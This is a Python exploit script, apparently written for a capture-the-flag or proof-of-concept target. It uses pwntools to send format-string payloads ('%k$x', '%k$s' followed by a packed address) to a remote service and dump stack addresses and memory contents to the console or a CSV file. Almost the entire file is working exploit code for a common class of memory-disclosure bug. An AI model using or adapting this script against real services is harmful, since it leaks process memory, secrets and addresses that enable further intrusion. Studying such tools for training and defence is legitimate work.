#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : stack_dumper.py
# Author             : Remi GASCOU (Podalirius)
# Date created       : 2025-01-31

import string
import argparse
import pwn


def oracle(payload):
    """
    Executes a format string vulnerability exploit to read the stack content.
    
    Parameters:
    payload (str): The payload to be sent to the target.
    
    Returns:
    str: The output from the target.
    """
    if type(payload) == str:
        payload = bytes(payload, "utf-8")
    try:
        conn = pwn.remote("challenge.poc.local", 14139, level="warn")
        conn.recvuntil(b"Please enter your choice:")
        conn.sendline(b"1")
        conn.recvuntil(b"Please enter the content you want to read:")
        conn.sendline(payload)
        conn.readline()
        out = conn.readline().decode('ISO-8859-1').strip()
    except EOFError as e:
        out = ""
    return out


msg_warn = "\x1b[1m[\x1b[91mWARN\x1b[0m\x1b[1m]\x1b[0m"


def cleanup_printable(inputstring):
    """
    Cleans up a given input string by ensuring all characters are printable.
    
    Parameters:
    inputstring (str): The string to be cleaned up.
    
    Returns:
    str: A cleaned-up string where non-printable characters are replaced with their hex representation.
    """
    out = ""
    for c in inputstring:
        if c in string.printable[:-5]:
            out += c # As is
        else:
            out += str(bytes(c, "ISO-8859-1"))[2:-1] # Hex format
    return out


def stack_dump(verbose=False, max_depth=250):
    """
    Dumps the stack content by exploiting a format string vulnerability.
    
    Parameters:
    verbose (bool): If True, prints detailed information during the stack dumping process.
    max_depth (int): The maximum depth to which the stack should be dumped.
    
    Returns:
    list: A list of stack entries, where each entry is a list containing the offset, address, and content.
    """
    stack, stack_entry = [],[]
    running = 1
    for k in range(1, max_depth + 1):
        if running == 1:
            stack_entry = ["", "", ""]
            line        = ""
            stack_entry[0] = "[%ebp - "+str(k).ljust(len(str(max_depth)))+"]"
            if verbose :
                print("\r[\x1b[1;93m%ebp\x1b[0m - \x1b[1;92m"+str(k).ljust(len(str(max_depth)))+"\x1b[0m] ",end="")

            # Creating payload to read (%ebp - k) => read address
            separator   = "|->"
            payload     = '%'+str(k)+'$x'
            result = oracle(payload)
            stack_entry[1] = result.split(separator)[-1].rjust(8, "0")

            # Creating payload to read (%ebp - k) => read content
            separator   = "|->"
            # payload     = '%'+str(k)+'$s'
            payload     = bytes('%'+str(k)+'$s','utf-8')+pwn.p32(0x404080)
            # print('\n', payload)
            result = oracle(payload)
            stack_entry[2] = result.replace("\n",'').split(separator)[-1][:60]
            stack_entry[2] = cleanup_printable(stack_entry[2])

            # If not empty string
            if len(stack_entry[2]) > 0:
                stack.append(stack_entry)
                line  += "\x1b[1;94m"+stack_entry[1]+"\x1b[0m"
                line  += " -> " + "\x1b[1;92m"+stack_entry[2]+"\x1b[0m"
                if verbose : print(line)
            if ("stack smashing detected" in line):
                if verbose :
                    print('stack smashing detected => (Probably a canary)')
                running = 0
    if verbose :
        print("")
    return stack


def stack_to_csv(stack:list, outcsvfile):
    """
    Exports the stack content to a CSV file.

    Parameters:
    stack (list): A list of stack entries, where each entry is a list containing the offset, address, and content.
    outcsvfile (str): The path to the output CSV file.

    Returns:
    None
    """
    f = open(outcsvfile, "w")
    f.write("offset;address;content"+"\n")
    for line in stack:
        f.write('"'+line[0]+'";"0x'+line[1]+'";"'+line[2]+'"\n')
    f.close()
    return


def parse_args():
    """
    Parses command-line arguments.

    Returns:
    argparse.Namespace: An object containing the parsed arguments.
    """
    parser = argparse.ArgumentParser()

    parser.add_argument("-q", "--quiet", help="Quiet output",   action="store_true", default=False)
    parser.add_argument("-c", "--csv",         help="Exports findings to CSV file.", type=str, default=None)

    return parser.parse_args()


if __name__ == '__main__':
    options = parse_args()

    if (not options.quiet):
        print("[+]====================================================")
        print("[+]           \x1b[1;96mStrings stack dumper v1.0.1\x1b[0m")
        print("[+] \x1b[96mSearching strings like needles in in a\x1b[0m (\x1b[1;93mhay\x1b[0m)\x1b[1;92mstack\x1b[0m")
        print("[+]====================================================\n")

    if options.csv != None:
        stack_to_csv(stack_dump(verbose=(not options.quiet)), options.csv)
    else:
        stack_dump(verbose=(not options.quiet))
